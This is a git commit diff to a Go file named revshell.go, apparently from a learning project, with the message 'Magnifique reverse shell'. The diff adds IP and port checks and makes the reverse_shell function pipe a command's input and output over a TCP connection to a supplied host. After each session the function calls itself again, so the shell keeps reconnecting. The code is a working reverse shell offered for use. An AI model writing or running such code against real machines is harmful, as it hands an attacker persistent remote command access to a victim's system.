e6ed1dc8cc83d75f54a37507d5ff143bdbdfccdf
Denis-REMACLE <denis.remacle@outlook.fr>
2022-10-20 11:05:34 +0200

    Magnifique reverse shell

--- first_project/reverseshell-and-pid/revshell/revshell.go
+++ first_project/reverseshell-and-pid/revshell/revshell.go
@@ -4,10 +4,65 @@ import (
 	"fmt"
 	"net"
 	"time"
+	"strconv"
 	"os/exec"
 )
 
+func check_ip(host string) bool {
+	ip := split(host, '.')
+	count := 0
+	for x := 0; x < len(ip); x++ {
+		if len(ip) != 4 {
+        		count++
+        		break
+            	}
+
+		tmp := 0
+        	tmp, err := strconv.Atoi(ip[x])
+        	if err != nil {
+        		panic(err)
+        		fmt.Println("la valeur entrée n'est pas la bonne")
+        		break
+        	}
+        	if (x == 0 && tmp <= 0 || tmp > 256) || (tmp < 0 || tmp > 256) {
+        		count++
+        	}
+        }
+	if count == 0 {
+		return true
+	} else {
+		return false
+	}
+}
+
+func split(tosplit string, sep rune) []string {
+	//string splitting function
+
+	var fields []string
+	last := 0
+	
+	for i,c := range tosplit {
+        	if c == sep {
+        	// Found the separator, append a slice
+        	fields = append(fields, string(tosplit[last:i]))
+        	last = i + 1
+		}
+	}
+
+	// Don't forget the last field
+	fields = append(fields, string(tosplit[last:]))
+
+	return fields
+}
+
 func reverse_shell(host string, port string) string {
+	value_port, _ := strconv.Atoi(port)
+	if value_port <= 1 || value_port > 65536 {
+		return "Port is wrong"
+	}
+	if check_ip(host) == false {
+		return "Ip is wrong"
+	}
 	connection, err := net.Dial("tcp", host+":"+port)
 	if nil != err {
 		time.Sleep(5 * time.Second)
@@ -19,14 +74,14 @@ func reverse_shell(host string, port string) string {
 
 	//Get user command
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection
-	for {
-		fmt.Println(connection)
-		//Launch user command and send user command output
-		cmd.Run()
-	}
+
+	//Launch user command and send user command output
+	cmd.Run()
+	
 	//Close connection
 	connection.Close()
-	return "Reverse shell over"
+	
+	return reverse_shell(host, port)
 }
 
 func main() {
